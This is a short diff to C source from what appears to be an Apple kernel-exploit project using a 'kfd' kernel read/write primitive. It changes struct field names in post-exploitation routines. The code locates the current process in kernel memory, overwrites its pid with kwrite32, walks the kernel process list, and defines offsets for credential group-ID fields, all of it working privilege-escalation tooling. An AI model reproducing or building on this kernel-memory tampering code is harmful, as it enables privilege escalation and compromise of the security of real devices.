@@ -28,7 +28,7 @@ uint64_t off_u_cr_rgid = 0x68;
 uint64_t off_u_cr_svgid = 0x6c;
 
 void postExploit(void) {
-    uint64_t proc = ((struct kfd*)_kfd)->info.kaddr.current_proc;
+    uint64_t proc = ((struct kfd*)_kfd)->info.kernel.current_proc;
     if (proc == -1) {
         printf("Failed to get proc\n");
         return;
@@ -37,11 +37,11 @@ void postExploit(void) {
     printf("pid: 0x%u\n", kread32(proc + off_p_pid));
     kwrite32(proc + off_p_pid, 200);
     printf("pid: 0x%u\n", kread32(proc + off_p_pid));
-    printf("Done! 9\n");
+    printf("Done! 10\n");
 }
 
 uint64_t getProc(pid_t pid) {
-    uint64_t proc = ((struct kfd*)_kfd)->info.kaddr.kernel_proc;
+    uint64_t proc = ((struct kfd*)_kfd)->info.kernel.kernel_proc;
     while (true) {
         if(kread32(proc + off_p_pid) == pid) {
             return proc;
